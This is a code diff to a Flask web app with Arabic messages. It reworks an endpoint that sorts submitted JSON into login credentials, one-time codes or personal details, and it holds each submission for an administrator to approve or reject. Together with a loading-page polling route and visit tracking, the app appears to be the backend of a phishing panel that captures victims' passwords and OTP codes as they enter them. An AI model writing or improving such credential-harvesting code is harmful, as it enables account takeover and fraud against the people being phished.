@@ -269,14 +269,27 @@ def admin_reject_otp(user_session_id):
 # ---- Submit Request ----
 @app.route("/submit_request", methods=["POST"])
 def submit_request():
-    if request.is_json:
-        data = request.get_json()
-        request_type = data.get("type")
-        user_data = data.get("data")
+    if not request.is_json:
+        return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400
+    
+    req_json = request.get_json()
+    if not req_json:
+        return jsonify({"status": "error", "message": "بيانات الطلب فارغة"}), 400
 
-        if not request_type or not user_data:
-            return jsonify({"status": "error", "message": "بيانات الطلب غير مكتملة"}), 400
+    # دعم الهيكلتين: إما مرسل بداخل type و data أو بيانات JSON مسطحة مباشرة
+    if "type" in req_json and "data" in req_json and isinstance(req_json.get("data"), dict):
+        request_type = req_json.get("type")
+        user_data = req_json.get("data")
+    else:
+        user_data = req_json
+        if "otp" in user_data or "otp_code" in user_data:
+            request_type = "otp"
+        elif "username" in user_data or "password" in user_data:
+            request_type = "login"
+        else:
+            request_type = "personal_info"
 
+    try:
         user, sid = get_or_create_user(current_page=request_type)
         user.current_page = request_type
         user.last_activity = datetime.datetime.now()
@@ -301,10 +314,11 @@ def submit_request():
         resp_status = "approved" if auto_approve else "pending"
         resp_msg = "تم استلام البيانات" if auto_approve else "تم استلام طلبك، بانتظار موافقة المسؤول"
         response = make_response(jsonify({"status": resp_status, "request_id": new_req.id, "message": resp_msg}), 200 if auto_approve else 202)
-        response.set_cookie('user_session_id', sid, max_age=86400*30)
+        response.set_cookie('user_session_id', sid, max_age=86400*30, path='/')
         return response
-    else:
-        return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400
+    except Exception as e:
+        db.session.rollback()
+        return jsonify({"status": "error", "message": str(e)}), 500
 
 
 # ---- Request Status (for loading page polling) ----
@@ -334,7 +348,7 @@ def track_visit():
         db.session.commit()
 
         response = make_response(jsonify({"status": "success", "message": "تم تحديث الزيارة"}))
-        response.set_cookie('user_session_id', sid, max_age=86400*30)
+        response.set_cookie('user_session_id', sid, max_age=86400*30, path='/')
         return response
     return jsonify({"status": "error", "message": "يجب أن يكون الطلب بصيغة JSON"}), 400
 
